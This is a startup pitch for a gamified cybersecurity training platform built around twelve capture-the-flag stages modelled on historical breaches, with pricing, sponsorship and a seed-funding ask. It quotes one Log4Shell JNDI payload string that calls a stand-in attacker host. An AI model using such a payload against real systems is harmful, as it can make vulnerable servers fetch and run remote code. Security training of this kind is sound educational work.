# Kryptós CronOS — The Pitch
**May 2026 | For people who get it**

---

## Here's the problem in one sentence

There are 3.5 million unfilled cybersecurity jobs and every single training product on the market is either boring as hell or impossible to use without a CS degree.

We're fixing that.

---

## What we built

Kryptós CronOS teaches cybersecurity the way it should have always been taught — by actually doing it.

Not watching a guy on YouTube explain SQL injection. Not reading a 400-page study guide. **Actually running the exploit in a simulated environment, on a replica of the real server where it happened.**

Stage 8? You're in a terminal, feeding `${jndi:ldap://attacker.com/x}` into a log parser, watching it call back to your LDAP server — the exact same trick that took down half the internet in December 2021 (Log4Shell, CVSS score: 10.0, the highest possible rating).

Stage 9? You're scanning a network, identifying port 445 open on a Windows box, and exploiting EternalBlue — the NSA-built exploit that WannaCry used to encrypt hospitals across 150 countries.

Then you capture a flag, earn XP, unlock a badge, and the leaderboard updates.

It's a game. It's also real security training. And that combination is genuinely rare.

---

## The 12 stages we have today

1. CIA Triad — the fundamentals (with a Caesar cipher challenge)
2. AI & Threat Detection — rogue models, SolarWinds
3. SQL Injection — Heartland Payment Systems, $130M breach
4. XSS — Samy Kamkar's MySpace worm, 1 million accounts in 20 hours
5. Heartbleed — the OpenSSL bug that leaked private keys for 2 years
6. Broken Access Control — AT&T exposed 114,000 iPad emails
7. Auth Failures — LinkedIn's 117M password breach, cracked with MD5
8. Log4Shell — CVSS 10.0, Java apps globally, still being exploited
9. WannaCry / EternalBlue — NHS shut down, $4B in damages
10. SSRF — Capital One, 100M customer records, fired cloud engineer
11. Equifax / Apache Struts — 147 million Americans' SSNs, $575M FTC fine
12. MongoDB Misconfiguration — 23,000 databases left open to the internet

Each one has: a full briefing (like a Wikipedia article written for someone who actually cares), an attack flow diagram, and a hands-on CTF challenge built on the real exploit.

---

## The gamification stuff that actually works

- **Linear progression** — you have to beat stage 3 to unlock stage 4. No skipping.
- **XP + leaderboard** — people are competitive. This works.
- **Badges** — "Log4Shell Hunter," "Zero Day Scout," "SQL Slayer" — these show up on your leaderboard profile
- **Reference drawer** — hit the 📖 button mid-challenge and pull up the full briefing without leaving the terminal. Because that's how real work happens.

---

## The AI roadmap (where it gets interesting)

Right now the content is static and excellent. The next version gets smarter about you specifically.

**Adaptive difficulty:** If you burn through the SQL injection challenge in 3 minutes, the platform routes you to blind SQLi and time-based injection instead of congratulating you. If you're stuck for 20 minutes, it scaffolds hints. The AI reads your behavior and adjusts.

**Personalized paths:** A developer gets SQL injection and XSS prioritized. A sysadmin gets network misconfigs and patching scenarios. An executive gets "what does this breach mean for my company" scenarios. Same content, different sequencing, different framing.

**In-terminal AI tutor:** You type a question in the terminal, it answers — without giving away the flag. "What does JNDI mean?" gets a real explanation. "What's the flag?" gets "Nice try."

**Weekly CVE drops:** Every week, a new challenge based on a real CVE published in the past 7 days. You're always training on current threats.

---

## Who's paying for this

### Direct to consumer
- Free tier: first 3 stages (gets you hooked)
- Pro: $19/month — everything, plus AI personalization and certificates
- Team: $12/seat for companies with 10+ people in training

### Enterprise
- $8/seat/month at 100+ seats
- SSO, admin dashboards, compliance reporting, custom curriculum
- Target: financial services (SEC now requires cybersecurity disclosure), healthcare (HIPAA), defense contractors (CMMC requirements)

### Sponsors — this is the fun part

Security vendors spend a fortune on brand awareness with practitioners. We give them a better channel than trade show booths:

- **CrowdStrike sponsors the "Threat Hunter" badge** — every learner who earns it gets a CrowdStrike exam voucher. CrowdStrike gets a qualified audience. We get a check.
- **AWS sponsors the SSRF stage** — co-branded "Cloud Security by AWS" stage with an AWS free-tier credit for completions
- **CompTIA sponsors certificate verification** — their cert discounts embedded in our badge completion emails
- **SentinelOne sponsors a weekly CVE challenge** — "SentinelOne Threat Intelligence Challenge of the Week"

The math: 50,000 learners earning security badges is an audience security vendors would pay $50–$200 CPM to reach on LinkedIn. We deliver them a far more engaged audience at a fraction of the cost, with measurable outcomes.

---

## Why now

Three things converging:
1. SEC's 2024 cybersecurity disclosure rules mean every public company's board is asking "do our people actually know security?" The answer is currently "no."
2. AI is making attacks cheaper and faster. The defender skill gap is widening in real time.
3. Gen Z learns differently — video and games, not textbooks. The platforms that figured out gaming (Duolingo, Brilliant) have demonstrated the model works.

We're bringing that model to the most high-stakes skill gap in enterprise tech.

---

## What exists today

This isn't a pitch deck with a mockup. It's a working product:

- 12 fully built stages with real CTF challenges
- Auth system (register, login, per-user progress)
- Leaderboard with live XP ranking
- Deployed and running: **kryptochron.vercel.app**
- GitHub: **github.com/jjfleetwood/kryptos-cronos**

Built by one founder with an AI coding environment in one sprint. No engineering team yet. The tech is production-grade Next.js — not a throwaway demo that needs to be rebuilt.

---

## The ask

**$1.5M seed to get to Series A in 18 months.**

That buys:
- 2 engineers for a year
- AI API budget for the personalization layer
- GTM to get to 50,000 users and $1.2M ARR
- Security hardening to make the enterprise sales conversations easy

At $1.2M ARR with a 50,000-user base and a clear enterprise pipeline, Series A is a real conversation at a real valuation.

---

## The one-liner version

**Kryptós CronOS is Duolingo for cybersecurity — except instead of translating Spanish sentences, you're exploiting the same vulnerability that cost Equifax $575 million.**

If that sounds like something people will pay for, let's talk.

---

*kryptochron.vercel.app | github.com/jjfleetwood/kryptos-cronos*
